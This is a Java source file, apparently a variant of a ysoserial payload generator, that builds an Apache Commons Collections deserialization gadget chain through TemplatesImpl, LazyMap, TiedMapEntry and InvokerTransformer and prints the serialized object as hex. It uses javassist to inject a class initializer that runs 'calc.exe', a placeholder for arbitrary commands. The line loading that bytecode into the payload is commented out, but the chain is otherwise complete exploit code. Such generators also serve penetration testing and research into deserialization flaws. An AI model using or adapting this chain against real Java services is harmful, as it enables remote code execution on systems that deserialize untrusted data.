package ysoserial.payloads.util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc10 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(String.valueOf(AbstractTranslet.class));
        CtClass ctClass = pool.get(cc10.class.getName());
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String code = "{java.lang.Runtime.getRuntime().exec(\"calc.exe\");}";
        ctClass.makeClassInitializer().insertAfter(code);
        ctClass.setName("evil");
        byte[] bytes = ctClass.toBytecode();
//        byte[][] bytecode = new byte[][]{bytes};
        byte[][] bytecode = new byte[][]{};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setField(templates,"_bytecodes",bytecode);
        setField(templates,"_name","test");
        setField(templates,"_class",null);
        setField(templates,"_tfactory", TransformerFactoryImpl.class.newInstance());
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap,transformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap,templates);
        Map expMap = new HashMap();
        expMap.put(tme,"valuevalue");
        outerMap.remove(templates);
        setField(transformer, "iMethodName", "newTransformer");

        System.out.println(unserUtils.objectToHexString(expMap));
//
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(expMap);
//        oos.close();
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();
    }
    public static void setField(Object obj, String field,Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj,value);
    }
}
